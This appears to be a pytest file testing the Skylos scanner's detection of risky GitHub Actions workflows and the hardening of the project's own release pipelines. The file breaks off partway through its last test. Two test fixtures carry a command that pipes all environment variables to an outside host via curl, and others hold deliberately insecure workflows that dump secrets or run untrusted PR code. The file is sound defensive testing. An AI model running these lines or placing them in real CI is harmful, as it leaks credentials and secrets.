import json
from pathlib import Path

import pytest
import yaml

from skylos.analyzer import analyze
from skylos.core.safe_cache_io import write_text_no_symlink
from skylos.rules.config import scan_config_files
from skylos.rules.config.cicd.github_actions import (
    scan_github_actions,
    scan_github_actions_file,
)


def _rule_ids(findings):
    return {finding["rule_id"] for finding in findings}


def _publish_workflow():
    return yaml.safe_load(Path(".github/workflows/publish.yml").read_text())


def _release_please_workflow():
    return yaml.safe_load(Path(".github/workflows/release-please.yml").read_text())


def _release_please_config():
    return json.loads(
        Path("tools/release/release-please-config.json").read_text(encoding="utf-8")
    )


def _tests_workflow():
    return yaml.safe_load(Path(".github/workflows/tests.yaml").read_text())


def _skylos_workflow():
    return yaml.safe_load(Path(".github/workflows/skylos.yaml").read_text())


def _composite_action():
    return yaml.safe_load(Path("action.yml").read_text())


def _write_risky_workflow(path):
    path.write_text(
        """
name: CI
on:
  pull_request_target:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: someorg/lint-action@v1
      - run: echo "${{ github.event.pull_request.title }}"
""".lstrip(),
        encoding="utf-8",
    )


def test_github_actions_scanner_detects_workflow_supply_chain_risks(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "ci.yml"
    _write_risky_workflow(workflow)

    findings = scan_github_actions(tmp_path)

    assert {
        "SKY-D290",
        "SKY-D291",
        "SKY-D292",
        "SKY-D293",
        "SKY-D294",
    }.issubset(_rule_ids(findings))
    assert {
        "kind": "config",
        "domain": "cicd",
        "provider": "github_actions",
        "type": "workflow",
    }.items() <= findings[0].items()


def test_github_actions_scanner_deduplicates_same_line_findings(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "ci.yml"
    workflow.write_text(
        """
name: CI
on: pull_request
jobs:
  one:
    runs-on: ubuntu-latest
    steps:
      - uses: someorg/action@v1
  two:
    runs-on: ubuntu-latest
    steps:
      - uses: someorg/action@v1
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)
    unpinned = [
        finding
        for finding in findings
        if finding["rule_id"] == "SKY-D292"
        and finding.get("value") == "someorg/action@v1"
    ]

    assert len(unpinned) == 1


def test_github_actions_run_block_env_exfil_flags(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "exfil.yml"
    workflow.write_text(
        """
name: Exfil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)

    assert "SKY-D327" in _rule_ids(findings)


def test_github_actions_multiline_run_block_env_exfil_line(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "exfil-block.yml"
    workflow.write_text(
        """
name: Exfil
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""".lstrip(),
        encoding="utf-8",
    )

    findings = [
        finding
        for finding in scan_github_actions(tmp_path)
        if finding["rule_id"] == "SKY-D327"
    ]

    assert findings
    assert findings[0]["line"] > 1


def test_github_actions_scanner_accepts_pinned_minimal_workflow(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "ci.yml"
    workflow.write_text(
        """
name: CI
on:
  pull_request:
permissions: {}
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
        with:
          persist-credentials: false
      - run: echo "$PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
""".lstrip(),
        encoding="utf-8",
    )

    assert scan_github_actions(tmp_path) == []


def test_github_actions_changed_files_stay_under_scan_root(tmp_path):
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    outside_workflows = outside / ".github" / "workflows"
    outside_workflows.mkdir(parents=True)
    repo.mkdir()
    outside_workflow = outside_workflows / "ci.yml"
    outside_workflow.write_text(
        """
name: CI
on:
  pull_request_target:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_config_files(
        repo,
        changed_files={str(outside_workflow), "../outside/.github/workflows/ci.yml"},
    )

    assert findings == []


def test_config_scanner_routes_single_github_actions_file(tmp_path):
    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True)
    _write_risky_workflow(workflow)

    findings = scan_config_files(workflow)

    assert {"SKY-D290", "SKY-D292", "SKY-D294"}.issubset(_rule_ids(findings))


def test_config_scanner_ignores_unowned_config_files(tmp_path):
    for relative in (
        "app.py",
        "config.yml",
        ".gitlab-ci.yml",
        "Jenkinsfile",
        "Dockerfile",
        "main.tf",
    ):
        path = tmp_path / relative
        path.write_text(
            """
name: CI
on:
  pull_request_target:
jobs:
  test:
    script:
      - echo test
""".lstrip(),
            encoding="utf-8",
        )

    assert scan_config_files(tmp_path) == []
    assert scan_config_files(tmp_path / "app.py") == []
    assert scan_config_files(tmp_path / "config.yml") == []
    assert scan_config_files(tmp_path / ".gitlab-ci.yml") == []
    assert scan_config_files(tmp_path / "Jenkinsfile") == []
    assert scan_config_files(tmp_path / "Dockerfile") == []
    assert scan_config_files(tmp_path / "main.tf") == []


def test_github_actions_scanner_detects_extended_offline_risks(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    full_sha = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
    workflow = workflows / "release.yml"
    workflow.write_text(
        f"""
name: Release
on:
  release:
permissions: read-all
jobs:
  publish:
    runs-on: [self-hosted, linux]
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
      API_KEY: ${{{{ secrets.PROD_TOKEN }}}}
    container:
      image: node:latest
      credentials:
        username: robot
        password: hardcoded-password
    steps:
      - uses: actions/cache@{full_sha}
        with:
          path: ~/.cache
          key: release-cache
      - uses: actions/create-github-app-token@{full_sha}
        with:
          owner: example
          skip-token-revoke: true
      - run: cat version.txt >> $GITHUB_ENV
      - if: contains('refs/heads/main refs/heads/release', github.ref)
        run: echo ref
      - if: github.actor == 'dependabot[bot]'
        run: echo bot
      - if: |
          ${{{{ github.event_name == 'release' }}}}
        run: echo multiline
      - run: echo "${{{{ toJSON(secrets) }}}}"
  call:
    uses: org/repo/.github/workflows/reuse.yml@{full_sha}
    secrets: inherit
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)

    assert {
        "SKY-D291",
        "SKY-D295",
        "SKY-D296",
        "SKY-D297",
        "SKY-D298",
        "SKY-D300",
        "SKY-D301",
        "SKY-D302",
        "SKY-D303",
        "SKY-D304",
        "SKY-D305",
        "SKY-D306",
        "SKY-D308",
    }.issubset(_rule_ids(findings))


def test_github_actions_scanner_detects_composite_action_risks(tmp_path):
    action = tmp_path / "action.yml"
    action.write_text(
        """
runs:
  using: docker
  image: alpine:latest
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)

    assert {"SKY-D296", "SKY-D307"}.issubset(_rule_ids(findings))


def test_github_actions_scanner_rejects_recursive_yaml_alias(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "ci.yml"
    workflow.write_text(
        """
name: CI
on: pull_request
jobs:
  test: &test
    runs-on: ubuntu-latest
    steps:
      - run: echo ok
    self: *test
""".lstrip(),
        encoding="utf-8",
    )

    assert scan_github_actions(tmp_path) == []


def test_github_actions_scanner_rejects_symlinked_workflow(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    target = tmp_path / "outside-workflow.yml"
    target.write_text("name: outside\non: push\n", encoding="utf-8")
    link = workflows / "ci.yml"
    try:
        link.symlink_to(target)
    except OSError:
        return

    assert scan_github_actions(tmp_path) == []


def test_github_actions_scanner_handles_shared_yaml_alias_once(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    workflow = workflows / "ci.yml"
    workflow.write_text(
        """
name: CI
on: issue_comment
x-secret-step: &secret-step
  run: echo "${{ secrets.PROD_TOKEN }}"
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - *secret-step
      - *secret-step
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)

    assert "SKY-D299" in _rule_ids(findings)


def test_github_actions_scanner_detects_issue_derived_hardening_gaps(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    full_sha = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
    workflow = workflows / "publish.yml"
    workflow.write_text(
        f"""
name: Publish
on:
  release:
permissions: {{}}
jobs:
  publish:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      id-token: write
    env:
      NPM_TOKEN: ${{{{ secrets.NPM_TOKEN }}}}
    services:
      redis:
        image: redis@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
        options: "--name ${{{{ github.event.release.name }}}}"
    steps:
      - run: |
          npm ci
          ./scripts/build.sh
          docker pull node:latest
      - uses: actions/upload-artifact@{full_sha}
        with:
          name: dist
          path: dist/
""".lstrip(),
        encoding="utf-8",
    )

    findings = scan_github_actions(tmp_path)

    assert {
        "SKY-D294",
        "SKY-D296",
        "SKY-D309",
        "SKY-D310",
        "SKY-D311",
        "SKY-D312",
    }.issubset(_rule_ids(findings))


def _assert_trusted_publishing_job(job):
    assert job["environment"]["name"] == "pypi"
    assert job["permissions"] == {"contents": "read", "id-token": "write"}
    upload_step = next(s for s in job["steps"] if s.get("name") == "Publish to PyPI")
    action, _, ref = upload_step["uses"].partition("@")
    assert action == "pypa/gh-action-pypi-publish"
    assert len(ref.split()[0]) == 40
    assert "password" not in upload_step.get("with", {})
    assert not any("run" in step for step in job["steps"])


def test_publish_workflows_use_trusted_publishing_without_a_stored_token():
    publish_text = Path(".github/workflows/publish.yml").read_text()
    release_text = Path(".github/workflows/release-please.yml").read_text()
    assert "PYPI_TOKEN" not in publish_text
    assert "PYPI_TOKEN" not in release_text
    assert "TWINE_PASSWORD" not in publish_text + release_text

    release_please = _release_please_workflow()
    pypi_publish = release_please["jobs"]["pypi-publish"]
    assert pypi_publish["needs"] == "publish-release"
    _assert_trusted_publishing_job(pypi_publish)

    publish = _publish_workflow()["jobs"]["publish"]
    assert publish["if"] == "${{ github.event_name == 'workflow_dispatch' }}"
    _assert_trusted_publishing_job(publish)


def test_publish_workflow_validates_strict_semver_release_tags():
    workflow = _publish_workflow()
    build_steps = workflow["jobs"]["build"]["steps"]
    resolve_step = next(
        s for s in build_steps if s.get("name") == "Resolve release tag input"
    )

    assert "semver_re=" in resolve_step["run"]
    assert "(0|[1-9][0-9]*)[.](0|[1-9][0-9]*)[.](0|[1-9][0-9]*)" in resolve_step["run"]


def test_publish_workflow_verifies_required_checks_before_publish():
    workflow = _publish_workflow()
    release_please = _release_please_workflow()

    assert workflow["jobs"]["build"]["permissions"]["checks"] == "read"
    assert workflow["jobs"]["build"]["timeout-minutes"] >= 75
    assert release_please["jobs"]["publish-release"]["permissions"]["checks"] == "read"

    build_steps = workflow["jobs"]["build"]["steps"]
    check_step = next(
        s for s in build_steps if s.get("name") == "Verify required release checks"
    )
    check_index = build_steps.index(check_step)
    setup_index = next(
        i for i, step in enumerate(build_steps) if step.get("name") == "Set up Python"
    )

    assert check_index < setup_index
    assert check_step["env"]["REQUIRED_RELEASE_CHECKS"] == (
        '["test", "analyzer-speed", "corpus", "quality-benchmark", "scan"]'
    )
    assert "gh api" in check_step["run"]
    assert "--paginate --slurp" in check_step["run"]
    assert "check-runs?per_page=100&filter=all" in check_step["run"]
    assert "for attempt in {1..180}" in check_step["run"]
    assert 'run["id"]' in check_step["run"]
    assert '"github-actions"' in check_step["run"]
    assert "Required release checks failed" in check_step["run"]
    assert "Required release checks are not complete yet" in check_step["run"]


def test_release_please_rechecks_completed_ci_on_current_main():
    workflow = _release_please_workflow()
    triggers = workflow.get("on", workflow.get(True))
    assert "push" not in triggers
    trigger = triggers["workflow_run"]
    assert trigger["branches"] == ["main"]
    assert trigger["types"] == ["completed"]
    producers = [
        "tests.yaml",
        "analyzer-speed.yml",
        "corpus.yml",
        "quality-benchmark.yml",
        "skylos.yaml",
    ]
    # Workflow-name filters are globs, including '+' as a quantifier.
    escape_globs = str.maketrans(
        {character: "\\" + character for character in r"\*?[]+!"}
    )
    assert set(trigger["workflows"]) == {
        yaml.safe_load((Path(".github/workflows") / name).read_text())["name"].translate(
            escape_globs
        )
        for name in producers
    }

    job = workflow["jobs"]["release-please"]
    assert job["permissions"]["checks"] == "read"
    assert job["timeout-minutes"] <= 15
    assert job["concurrency"] == {
        "group": "release-please-main",
        "cancel-in-progress": False,
        "queue": "max",
    }
    assert job["if"] == (
        "github.event.workflow_run.event == 'push' && "
        "github.event.workflow_run.head_branch == 'main' && "
        "github.event.workflow_run.head_repository.full_name == github.repository && "
        "github.event.workflow_run.head_sha == github.sha && "
        "github.event.workflow_run.conclusion == 'success'"
    )
    steps = job["steps"]
    head_step = next(s for s in steps if s.get("id") == "main_commit")
    check_step = next(s for s in steps if s.get("id") == "checks")
    release_step = next(s for s in steps if s.get("id") == "release")
    assert "git/ref/heads/main" in head_step["run"]
    tested_sha = "${{ github.event.workflow_run.head_sha }}"
    assert head_step["env"]["TESTED_SHA"] == tested_sha
    assert check_step["env"]["TESTED_SHA"] == tested_sha
    checkout = next(s for s in steps if s.get("uses", "").startswith("actions/checkout@"))
    assert checkout["with"]["ref"] == tested_sha
    assert "check_release_checks.py" in check_step["run"]
    assert "check-runs?per_page=100&filter=all" in check_step["run"]
    assert "--paginate --slurp" in check_step["run"]
    assert "for attempt in 1 2 3" in check_step["run"]
    poll = check_step["run"].split("for attempt in 1 2 3; do", 1)[1]
    before_check = poll.split("check-runs?per_page=100&filter=all", 1)[0]
    assert "git/ref/heads/main" in before_check
    assert 'if [[ "$TESTED_SHA" != "$main_sha" ]]; then' in before_check
    assert "exit 0" in before_check
    assert "Release deferred" in check_step["run"]
    assert release_step["if"] == "steps.checks.outputs.ready == 'true'"
    assert release_step["with"]["target-branch"] == "main"
    assert not {"SKY-D290", "SKY-D305"}.intersection(
        _rule_ids(scan_github_actions_file(".github/workflows/release-please.yml"))
    )


def test_release_please_updates_skylos_version_in_uv_lock():
    package_config = _release_please_config()["packages"]["."]

    assert {
        "type": "toml",
        "path": "uv.lock",
        "jsonpath": "$.package[?(@.name.value=='skylos')].version",
    } in package_config["extra-files"]


def test_release_please_keeps_mcp_server_json_version_in_sync():
    extra_files = _release_please_config()["packages"]["."]["extra-files"]
    for jsonpath in ("$.version", "$.packages[?(@.identifier=='skylos')].version"):
        assert {
            "type": "json",
            "path": "server.json",
            "jsonpath": jsonpath,
        } in extra_files

    server = json.loads(Path("server.json").read_text(encoding="utf-8"))
    manifest = json.loads(
        Path("tools/release/.release-please-manifest.json").read_text(encoding="utf-8")
    )
    package = next(p for p in server["packages"] if p["identifier"] == "skylos")
    assert server["version"] == package["version"] == manifest["."]
    # The MCP registry schema caps the description at 100 characters.
    assert 0 < len(server["description"]) <= 100


def test_tests_workflow_pins_codecov_and_limits_permissions():
    workflow = _tests_workflow()
    assert workflow["permissions"] == {"contents": "read"}

    steps = workflow["jobs"]["test_matrix"]["steps"]
    codecov_step = next(
        s for s in steps if s.get("name") == "Upload coverage to Codecov"
    )
    action_ref = codecov_step["uses"].split("@", 1)[1]

    assert len(action_ref) == 40
    assert all(c in "0123456789abcdef" for c in action_ref)
    assert codecov_step["with"]["token"] == "${{ secrets.CODECOV_TOKEN }}"
    assert codecov_step["with"]["files"] == "./coverage.xml"
    assert codecov_step["with"]["disable_search"] is True


def test_tests_workflow_preserves_unlocked_uv_pip_environment():
    steps = _tests_workflow()["jobs"]["test_matrix"]["steps"]
    lock_step = next(s for s in steps if s.get("name") == "Check lockfile")
    install_step = next(
        s for s in steps if s.get("name") == "Create venv + install deps"
    )
    test_step = next(s for s in steps if s.get("name") == "Run tests with coverage")

    assert lock_step["run"] == "uv lock --check"
    assert install_step["run"].count("uv pip install --python .venv/bin/python") == 2
    assert ".venv/bin/python -m pytest" in test_step["run"]
    assert "uv run" not in test_step["run"]


def test_skylos_pr_workflow_uses_trusted_scanner_package():
    workflow = _skylos_workflow()
    assert workflow["permissions"] == {"contents": "read"}

    steps = workflow["jobs"]["scan"]["steps"]
    checkout_step = next(
        s for s in steps if str(s.get("uses", "")).startswith("actions/checkout@")
    )
    checkout_ref = checkout_step["uses"].split("@", 1)[1]
    assert len(checkout_ref) == 40
    assert all(c in "0123456789abcdef" for c in checkout_ref)
    assert checkout_step["with"]["persist-credentials"] is False

    setup_go_step = next(
        s for s in steps if str(s.get("uses", "")).startswith("actions/setup-go@")
    )
    assert setup_go_step["with"]["cache"] is False

    go_build_step = next(s for s in steps if s.get("name") == "Build repo Go engine")
    assert go_build_step["if"] == "github.event_name != 'pull_request'"

    pr_install_step = next(
        s for s in steps if s.get("name") == "Install trusted Skylos for pull requests"
    )
    assert pr_install_step["if"] == "github.event_name == 'pull_request'"
    assert '"skylos>=4.7.0"' in pr_install_step["run"]
    assert "-e ." not in pr_install_step["run"]

    local_install_step = next(
        s for s in steps if s.get("name") == "Use repo Skylos on trusted refs"
    )
    assert local_install_step["if"] == "github.event_name != 'pull_request'"
    assert "-e ." in local_install_step["run"]

    scan_step = next(s for s in steps if s.get("name") == "Run Skylos")
    assert "python -m skylos.cli" not in scan_step["run"]
    assert ".venv/bin/skylos" in scan_step["run"]
    full_scan = scan_step["run"].split("\nelse\n", 1)[1].split("\nfi", 1)[0]
    assert "--baseline" not in full_scan
    assert "--diff" not in full_scan

    advisory_step = next(
        s for s in steps if s.get("name") == "Report findings (advisory)"
    )
    assert "--advisory" in advisory_step["run"]

    blocker_step = next(
        s for s in steps if s.get("name") == "Block high-risk security findings"
    )
    assert blocker_step["if"] == "always() && steps.scan.outcome == 'success'"
    assert "HIGH" in blocker_step["run"]
    assert "CRITICAL" in blocker_step["run"]
    assert 'for category in ("danger", "secrets")' in blocker_step["run"]
    assert "raise SystemExit(1)" in blocker_step["run"]


def test_skylos_pr_workflow_builds_go_engine_from_immutable_base():
    steps = _skylos_workflow()["jobs"]["scan"]["steps"]
    build_step = next(
        s
        for s in steps
        if s.get("name") == "Build trusted base Go engine for pull requests"
    )

    assert build_step["if"] == "github.event_name == 'pull_request'"
    assert build_step["env"]["TRUSTED_BASE_SHA"] == (
        "${{ github.event.pull_request.base.sha }}"
    )
    build_script = build_step["run"]
    assert '[[ ! "$TRUSTED_BASE_SHA" =~ ^[0-9a-f]{40}$ ]]' in build_script
    assert 'git cat-file -e "$TRUSTED_BASE_SHA^{commit}"' in build_script
    assert (
        'git archive "$TRUSTED_BASE_SHA" -- skylos/engines/go | tar -x' in build_script
    )
    assert 'cd "$TRUSTED_SOURCE_ROOT/skylos/engines/go"' in build_script
    assert "go build -trimpath" in build_script
    assert '"$ENGINE_DIR/skylos-go" --version' in build_script
    assert "github.head_ref" not in build_script
    assert "github.sha" not in build_script

    scan_step = next(s for s in steps if s.get("name") == "Run Skylos")
    assert scan_step["env"]["SKYLOS_GO_BIN"] == (
        "${{ format('{0}/skylos-go-engine/skylos-go', runner.temp) }}"
    )


def test_skylos_workflow_reports_incomplete_scan_before_preserving_exit_code():
    scan_job = _skylos_workflow()["jobs"]["scan"]
    assert scan_job["timeout-minutes"] == 20

    steps = scan_job["steps"]
    scan_step = next(s for s in steps if s.get("name") == "Run Skylos")
    scan_script = scan_step["run"]

    assert scan_step["env"]["SKYLOS_GREP_BUDGET"] == "120"
    assert "set +e" in scan_script
    assert "SCAN_STATUS=$?" in scan_script
    assert 'echo "status=$SCAN_STATUS" >> "$GITHUB_OUTPUT"' in scan_script
    assert '[ ! -s "$REPORT" ]' in scan_script

    preserve_step = next(
        s for s in steps if s.get("name") == "Preserve Skylos scan exit code"
    )
    assert preserve_step["if"] == ("always() && steps.scan.outputs.status != '0'")
    assert preserve_step["env"]["SCAN_STATUS"] == "${{ steps.scan.outputs.status }}"
    assert 'exit "$SCAN_STATUS"' in preserve_step["run"]

    preserve_index = steps.index(preserve_step)
    report_steps = {
        "Report findings (advisory)",
        "Block high-risk security findings",
        "GitHub annotations",
        "Upload report artifact",
    }
    assert all(
        next(s for s in steps if s.get("name") == name)["if"]
        == "always() && steps.scan.outcome == 'success'"
        for name in report_steps
    )
    assert all(
        steps.index(next(s for s in steps if s.get("name") == name)) < preserve_index
        for name in report_steps
    )
    artifact_step = next(s for s in steps if s.get("name") == "Upload report artifact")
    assert artifact_step["with"]["if-no-files-found"] == "error"


def test_skylos_workflow_routes_github_context_through_environment():
    steps = _skylos_workflow()["jobs"]["scan"]["steps"]
    diff_step = next(s for s in steps if s.get("name") == "Resolve diff base")

    assert diff_step["env"] == {
        "EVENT_NAME": "${{ github.event_name }}",
        "PR_BASE_SHA": "${{ github.event.pull_request.base.sha }}",
        "BEFORE_SHA": "${{ github.event.before }}",
    }
    assert "${{" not in diff_step["run"]
    assert '[[ ! "$PR_BASE_SHA" =~ ^[0-9a-f]{40}$ ]]' in diff_step["run"]
    assert 'git cat-file -e "$PR_BASE_SHA^{commit}"' in diff_step["run"]
    assert 'echo "base=$PR_BASE_SHA"' in diff_step["run"]
    assert '[[ "$BEFORE_SHA" =~ ^[0-9a-f]{40}$ ]]' in diff_step["run"]
    assert 'git cat-file -e "$BEFORE_SHA^{commit}"' in diff_step["run"]
    assert 'git merge-base --is-ancestor "$BEFORE_SHA" HEAD' in diff_step["run"]
    assert 'echo "base=" >> "$GITHUB_OUTPUT"' in diff_step["run"]
    assert "git fetch" not in diff_step["run"]
    assert "origin/" not in diff_step["run"]


def test_composite_action_validates_and_quotes_max_comments_input():
    action = _composite_action()
    steps = action["runs"]["steps"]
    review_step = next(s for s in steps if s.get("name") == "Post PR Review Comments")
    run = review_step["run"]

    assert review_step["env"]["SKYLOS_MAX_COMMENTS"] == "${{ inputs.max-comments }}"
    assert "${{ inputs.max-comments }}" not in run
    assert '"$SKYLOS_MAX_COMMENTS"' in run
    assert "=~ ^[0-9]+$" in run


def test_composite_action_preserves_incomplete_scan_exit_code():
    action = _composite_action()
    steps = action["runs"]["steps"]
    scan_step = next(s for s in steps if s.get("name") == "Run Skylos Scan")
    gate_step = next(s for s in steps if s.get("name") == "Quality Gate")

    assert "|| true" not in scan_step["run"]
    assert "SCAN_STATUS=$?" in scan_step["run"]
    assert 'if [ "$SCAN_STATUS" -eq 2 ]' in scan_step["run"]
    assert "exit 2" in scan_step["run"]
    assert "set +e" in gate_step["run"]
    assert "RESULT=$?" in gate_step["run"]
    assert 'exit "$RESULT"' in gate_step["run"]


def test_composite_action_builds_platform_native_go_engine():
    action = _composite_action()
    steps = action["runs"]["steps"]
    detect_step = next(s for s in steps if s.get("name") == "Detect Go sources")
    setup_step = next(s for s in steps if s.get("name") == "Set up Go")
    build_step = next(s for s in steps if s.get("name") == "Build Skylos Go engine")

    assert detect_step["env"]["SKYLOS_PATH"] == "${{ inputs.path }}"
    assert 'find "$SKYLOS_PATH"' in detect_step["run"]
    assert "present=true" in detect_step["run"]
    assert "present=false" in detect_step["run"]
    go_sources_condition = "steps.go_sources.outputs.present == 'true'"
    assert setup_step["if"] == go_sources_condition
    assert build_step["if"] == go_sources_condition

    setup_ref = setup_step["uses"].split("@", 1)[1]
    assert len(setup_ref) == 40
    assert all(char in "0123456789abcdef" for char in setup_ref)
    assert setup_step["with"]["go-version"] == "1.22.x"
    assert setup_step["with"]["cache"] is False

    assert build_step["env"]["SKYLOS_ACTION_PATH"] == "${{ github.action_path }}"
    assert 'cd "$SKYLOS_ACTION_PATH/skylos/engines/go"' in build_step["run"]
    assert "go build -trimpath" in build_step["run"]
    assert 'ENGINE_NAME="skylos-go.exe"' in build_step["run"]
    assert '"$ENGINE_DIR/$ENGINE_NAME"' in build_step["run"]
    assert "$GITHUB_ENV" not in build_step["run"]

    expected_engine = (
        "${{ format('{0}/skylos-go-engine/skylos-go{1}', runner.temp, "
        "runner.os == 'Windows' && '.exe' || '') }}"
    )
    scan_steps = [
        s
        for s in steps
        if s.get("name") in {"Run Skylos Scan", "Upload to Skylos Dashboard"}
    ]
    assert len(scan_steps) == 2
    assert all(s["env"]["SKYLOS_GO_BIN"] == expected_engine for s in scan_steps)


def test_composite_action_passes_skylos_actions_audit():
    assert scan_github_actions_file("action.yml", root=".") == []


def test_analyzer_reports_github_actions_dangers_without_source_files(tmp_path):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "ci.yml").write_text(
        """
name: CI
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: someorg/build-action@v1
""".lstrip(),
        encoding="utf-8",
    )

    result = json.loads(analyze(str(tmp_path), enable_danger=True))

    assert "danger" in result
    assert {"SKY-D290", "SKY-D291", "SKY-D292", "SKY-D293"}.issubset(
        _rule_ids(result["danger"])
    )
    assert result["analysis_summary"]["danger_count"] == len(result["danger"])


_ISOLATED_PR_TARGET = """
name: Skylos
on:
  pull_request_target:
    types: [opened, synchronize]
  push:
    branches: [main]
permissions: {}
jobs:
  policy:
    if: github.event_name == 'pull_request_target' || github.event_name == 'push'
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - run: echo "reads trusted policy with the base branch's workflow"
  scan:
    if: github.event_name == 'pull_request_target'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: read
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/head
          path: pr-source
          persist-credentials: false
      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065
        with:
          python-version: '3.11'
      - run: skylos . --json -o report.json
  publish:
    if: github.event_name == 'pull_request_target'
    runs-on: ubuntu-latest
    needs: scan
    permissions:
      contents: read
      id-token: write
    steps:
      - run: python publish.py
"""


def _pr_target_rule_ids(tmp_path, text):
    workflow = tmp_path / ".github" / "workflows" / "skylos.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    assert write_text_no_symlink(workflow, text.lstrip(), encoding="utf-8")
    return _rule_ids(scan_github_actions_file(workflow))


def test_isolated_pull_request_target_workflow_is_not_a_dangerous_trigger(tmp_path):
    assert "SKY-D290" not in _pr_target_rule_ids(tmp_path, _ISOLATED_PR_TARGET)


def test_pull_request_target_reading_pr_code_with_privileges_is_still_flagged(tmp_path):
    variants = {
        "write token": _ISOLATED_PR_TARGET.replace(
            "      contents: read\n      actions: read\n",
            "      contents: write\n      actions: read\n",
        ),
        "oidc token": _ISOLATED_PR_TARGET.replace(
            "      contents: read\n      actions: read\n",
            "      contents: read\n      id-token: write\n",
        ),
        "persisted credentials": _ISOLATED_PR_TARGET.replace(
            "          persist-credentials: false\n", ""
        ),
        "shared cache": _ISOLATED_PR_TARGET.replace(
            "          python-version: '3.11'\n",
            "          python-version: '3.11'\n          cache: pip\n",
        ),
        "secrets": _ISOLATED_PR_TARGET.replace(
            "      - run: skylos . --json -o report.json\n",
            "      - run: skylos . --json -o report.json\n"
            "        env:\n          TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n",
        ),
        "undeclared permissions": _ISOLATED_PR_TARGET.replace(
            "permissions: {}\n", ""
        ).replace("    permissions:\n      contents: read\n      actions: read\n", ""),
        "untrusted template": _ISOLATED_PR_TARGET.replace(
            'echo "reads trusted policy with the base branch\'s workflow"',
            'echo "${{ github.event.pull_request.title }}"',
        ),
        "gh pr checkout": _ISOLATED_PR_TARGET.replace(
            "      - run: python publish.py\n",
            "      - run: gh pr checkout ${{ github.event.number }} && make build\n",
        ),
    }
    for label, text in variants.items():
        assert "SKY-D290" in _pr_target_rule_ids(tmp_path, text), label


# Severity calibration (W3: spring-petclinic "Risk: HIGH" from unpinned
# actions/checkout). GitHub-owned actions at a ref are LOW hygiene; every
# other owner stays HIGH, privileged workflows included.
_UNPINNED_USES = """
name: ci
on: {trigger}
permissions:
  contents: {perm}
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
      - uses: actions/setup-python@main
      - uses: someorg/action@v1
      - uses: tj-actions/changed-files@v45
      - uses: actions/checkout@${{{{ inputs.ref }}}}
      - uses: actions-rs/toolchain@v1
      - uses: github-actions/foo@v1
      - uses: actions/cache/./@v4
      - uses: actions//checkout@v4
      - uses: actions/setup-node@0b93645e9fea7318ecaed2b359559ac225c90a2b
  reuse:
    uses: actions/reusable/.github/workflows/x.yml@v1
"""


def _unpinned_severities(tmp_path, trigger, perm):
    workflows = tmp_path / ".github" / "workflows"
    workflows.mkdir(parents=True)
    assert write_text_no_symlink(
        workflows / "ci.yml",
        _UNPINNED_USES.format(trigger=trigger, perm=perm),
        encoding="utf-8",
    )
    return {
        finding["value"]: finding["severity"]
        for finding in scan_github_actions(tmp_path)
        if finding["rule_id"] == "SKY-D292"
    }



@pytest.mark.parametrize(
    ("trigger", "perm"),
    [("pull_request", "read"), ("pull_request_target", "write")],
)
def test_unpinned_github_owned_actions_are_low_and_third_party_high(
    tmp_path, trigger, perm
):
    assert _unpinned_severities(tmp_path, trigger, perm) == {
        "actions/checkout@v4": "LOW",
